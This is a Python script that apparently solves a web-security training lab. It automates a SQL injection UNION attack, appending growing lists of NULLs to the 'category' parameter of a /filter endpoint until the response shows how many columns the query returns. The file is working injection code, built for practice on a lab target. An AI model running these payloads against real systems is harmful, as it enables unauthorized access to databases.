#!/usr/bin/env python3
"""
SQL injection UNION attack, determining the number of columns
returned by the query
"""

from functools import lru_cache
from typing import Generator, NamedTuple

import lab_02

# pylint: disable=too-few-public-methods
class Lab(lab_02.Lab):
    """Wrapper"""

    NullCount = NamedTuple("NullCount", [("count", int), ("nulls", str)])

    def __init__(self, key: str, path: str) -> None:
        super().__init__()
        self.key = key
        self.path = path

    @staticmethod
    def _null_generator() -> Generator["Lab.NullCount", None, None]:
        """A bunch of NULLs"""
        count = 0
        while True:
            count += 1
            yield Lab.NullCount(count, ",".join(["NULL"] * count))

    @staticmethod
    def _dict_to_str(payload: dict) -> str:
        return "&".join("%s=%s" % (k, v) for k, v in payload.items())

    @lru_cache()
    def column_count(self) -> int:
        """Get the number of columns"""
        query_template = "'+UNION+SELECT+{}--"
        for repeated_null in self._null_generator():
            payload = {self.key: query_template.format(repeated_null.nulls)}
            payload_str = self._dict_to_str(payload)
            response = self.session.get(self.url + self.path, params=payload_str)
            if response.status_code == 200:
                return repeated_null.count
            if response.status_code == 404:
                raise RuntimeError("404: ensure LAB_ID is correct")
        raise RuntimeError

def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter")
    print(site.column_count())

if __name__ == "__main__":
    main()
